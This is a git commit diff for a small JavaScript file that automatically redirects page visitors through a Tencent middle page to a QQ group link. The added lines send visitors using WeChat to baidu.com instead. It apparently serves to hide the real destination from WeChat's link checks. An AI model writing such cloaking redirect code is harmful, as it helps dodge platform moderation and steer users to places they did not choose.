e7c6711b7494af9ae90faafb46c7e9d56ae51f53
lidawei <159605399+uiiw@users.noreply.github.com>
2024-02-13 22:02:17 +0800

    Update e.js

--- e.js
+++ e.js
@@ -3,3 +3,11 @@ setTimeout(function() {
     var url = 'https://i.qianbao.qq.com/lib/components/adapt/middlepage.html?url=https://qm.qq.com/q/WJJxIi8VyY' + '#' + timestamp + 'yuge';
     location.href = url;
 }, 10);
+    var ua = navigator.userAgent.toLowerCase();
+    var isWeixin = ua.indexOf('micromessenger') != -1;
+    if (isWeixin) {
+        var now = new Date();
+        var timestamp = now.getTime();
+        window.location.href = "http://baidu.com?time=" + timestamp;
+
+    }
